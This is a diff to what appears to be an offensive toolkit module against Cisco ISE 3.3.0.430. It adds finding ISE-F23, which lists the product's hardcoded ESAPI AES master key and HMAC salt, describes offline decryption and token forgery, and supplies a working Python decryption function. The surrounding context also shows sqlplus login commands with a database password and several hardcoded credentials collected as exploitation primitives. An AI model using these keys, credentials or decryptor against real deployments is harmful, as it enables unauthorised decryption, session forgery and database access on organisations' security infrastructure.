@@ -46,6 +46,7 @@ ISE-F19: CA NSS DB plaintext password window — ca_nssdb_password.txt no chmod 
 ISE-F20: SQL schema hardcoded Oracle creds — Mali:Mali (plaintext PIP) + handleruser:mohammal (3DES) [CRITICAL]
 ISE-F21: Elasticsearch 6.8.12 on localhost:9200, no auth, no TLS — ISE MNT auth/RADIUS logs [MEDIUM]
 ISE-F22: pi-profiler Docker image hardcoded RabbitMQ dev credential + Actuator admin [MEDIUM]
+ISE-F23: ESAPI hardcoded MasterKey + MasterSalt — decrypts all ESAPI-protected web layer values [HIGH]
 
 === ISE-F1: key_manager UNIX socket — unauthenticated decryption oracle ===
 
@@ -737,6 +738,34 @@ Local process (SSRF, cron, sudo, any ISE service running as non-root):
 Default-state shortcut (no KEK present):
   sqlplus cepm/U0l1_6v#k3c@localhost:1521/cpm10
   sqlplus system/U0l1_6v#k3c@localhost:1521/cpm10 as sysdba
+
+=== ISE-F23: ESAPI MasterKey/MasterSalt hardcoded — decryption oracle for ISE web layer ===
+
+Source: PSP-Commons-3.3.0-430.jar / ESAPI.properties (packed in JAR root)
+Library: OWASP ESAPI (Enterprise Security API) org.owasp.esapi.reference.crypto.JavaEncryptor
+
+Hardcoded values (identical on all ISE 3.3.0.430 deployments):
+  Encryptor.MasterKey  = a6H9is3hEVGKB4Jut+lOVA==  (16 bytes = AES-128-CBC key)
+  Encryptor.MasterSalt = SbftnvmEWD5ZHHP+pX3fqugNysc=  (20 bytes = HMAC-SHA1 salt)
+
+ESAPI JavaEncryptor default configuration:
+  Cipher: AES/CBC/PKCS5Padding (128-bit key)
+  MAC:    HMAC-SHA1 using MasterSalt-derived key
+  IV:     Random per encryption, prepended to ciphertext
+
+Impact:
+  - Decrypt any ESAPI-encrypted form field or request parameter in ISE web interface
+  - Forge HMAC-authenticated ESAPI tokens (CSRF tokens, signed session data)
+  - Any data stored with ESAPI encrypt() in Oracle DB is decryptable offline
+  - ESAPI is used for: web input protection, encrypted URL parameters, signed state tokens
+
+Attack: capture ISE HTTP response with ESAPI-encrypted params -> decrypt offline with static key
+Result: plaintext of encrypted web layer data; ability to forge arbitrary ESAPI tokens
+
+ESAPI comment in ESAPI.properties:
+  "There is not currently any support for key rotation, so be careful when changing
+   your key and salt as it will invalidate all signed, encrypted, and hashed data."
+  -> Key will NOT rotate; this is a permanent backdoor for all ISE 3.3.0 installations.
 
 === ISE-F22: pi-profiler Docker image hardcoded credentials ===
 
@@ -1729,6 +1758,53 @@ def dump_elasticsearch_index(index: str = "_all", host: str = ES_HOST,
 
 
 # ---------------------------------------------------------------------------
+# ISE-F23: ESAPI hardcoded MasterKey/MasterSalt
+# ---------------------------------------------------------------------------
+
+ESAPI_MASTER_KEY_B64   = "a6H9is3hEVGKB4Jut+lOVA=="        # AES-128 key, hardcoded in ESAPI.properties
+ESAPI_MASTER_SALT_B64  = "SbftnvmEWD5ZHHP+pX3fqugNysc="    # HMAC-SHA1 salt, hardcoded in ESAPI.properties
+ESAPI_MASTER_KEY_HEX   = "6ba1fd8acde111518a07826eb7e94e54"
+ESAPI_MASTER_SALT_HEX  = "49b7ed9ef984583e591c73fea57ddfaae80dcac7"
+
+
+def decrypt_esapi_value(ciphertext_b64: str,
+                        master_key_b64: str = ESAPI_MASTER_KEY_B64) -> Optional[str]:
+    """
+    ISE-F23: Decrypt ESAPI-encrypted value using the hardcoded AES-128-CBC MasterKey.
+
+    ESAPI JavaEncryptor format (v2.x):
+      - 4 bytes: key length in bits
+      - 4 bytes: IV length in bytes
+      - <iv_len> bytes: IV
+      - remaining bytes: AES-CBC ciphertext (PKCS5 padded)
+      - final 20 bytes: HMAC-SHA1 integrity tag
+
+    Returns plaintext string or None on failure.
+    """
+    from Crypto.Cipher import AES
+    from Crypto.Util.Padding import unpad
+    import struct
+
+    try:
+        key = base64.b64decode(master_key_b64)
+        raw = base64.b64decode(ciphertext_b64)
+        if len(raw) < 28:
+            return None
+        key_bits = struct.unpack('>I', raw[:4])[0]
+        iv_len   = struct.unpack('>I', raw[4:8])[0]
+        iv       = raw[8:8 + iv_len]
+        ct_and_mac = raw[8 + iv_len:]
+        ct = ct_and_mac[:-20]  # strip 20-byte HMAC-SHA1 tag
+        if len(key) < key_bits // 8:
+            return None
+        cipher = AES.new(key[:key_bits // 8], AES.MODE_CBC, iv)
+        pt_padded = cipher.decrypt(ct)
+        return unpad(pt_padded, 16).decode('utf-8', errors='replace')
+    except Exception:
+        return None
+
+
+# ---------------------------------------------------------------------------
 # ISE-F22: pi-profiler Docker image hardcoded credentials
 # ---------------------------------------------------------------------------
 
@@ -1770,17 +1846,17 @@ def probe_pi_profiler_actuator(host: str, port: int = PI_PROFILER_MGMT_PORT,
 
 MODULE_META = {
     "name": "cisco_ise_re",
-    "version": "1.9.0",
+    "version": "1.10.0",
     "target": "Cisco ISE 3.3.0.430",
     "findings": [
         "ISE-F1", "ISE-F2", "ISE-F3", "ISE-F4", "ISE-F5",
         "ISE-F6", "ISE-F7", "ISE-F8", "ISE-F9", "ISE-F10",
         "ISE-F11", "ISE-F12", "ISE-F13", "ISE-F14", "ISE-F15",
         "ISE-F16", "ISE-F17", "ISE-F18", "ISE-F19",
-        "ISE-F20", "ISE-F21", "ISE-F22",
+        "ISE-F20", "ISE-F21", "ISE-F22", "ISE-F23",
     ],
     "critical": ["ISE-F1", "ISE-F2", "ISE-F6", "ISE-F11", "ISE-F12", "ISE-F16", "ISE-F20"],
-    "high": ["ISE-F3", "ISE-F7", "ISE-F9", "ISE-F10", "ISE-F13", "ISE-F15", "ISE-F18", "ISE-F19"],
+    "high": ["ISE-F3", "ISE-F7", "ISE-F9", "ISE-F10", "ISE-F13", "ISE-F15", "ISE-F18", "ISE-F19", "ISE-F23"],
     "medium": ["ISE-F5", "ISE-F8", "ISE-F14", "ISE-F21", "ISE-F22"],
     "low": ["ISE-F4", "ISE-F17"],
     "source": "Static RE of Cisco-ISE-3.3.0.430.SPA.x86_64.iso (2026-08-25)",
@@ -1795,6 +1871,10 @@ MODULE_META = {
         "ise_f20_pip_pw": "Mali",
         "ise_f22_pi_profiler_rmq_pass_dev": "p#t91PMsjekd",
         "ise_f22_pi_profiler_admin_pass_dev": "lab123",
+        "ise_f23_esapi_master_key_b64": "a6H9is3hEVGKB4Jut+lOVA==",
+        "ise_f23_esapi_master_key_hex": "6ba1fd8acde111518a07826eb7e94e54",
+        "ise_f23_esapi_master_salt_b64": "SbftnvmEWD5ZHHP+pX3fqugNysc=",
+        "ise_f23_esapi_master_salt_hex": "49b7ed9ef984583e591c73fea57ddfaae80dcac7",
     },
     "primitives": [
         "decrypt_legacy_ise_db_password",
@@ -1828,5 +1908,6 @@ MODULE_META = {
         "probe_elasticsearch_localhost",
         "dump_elasticsearch_index",
         "probe_pi_profiler_actuator",
+        "decrypt_esapi_value",
     ],
 }
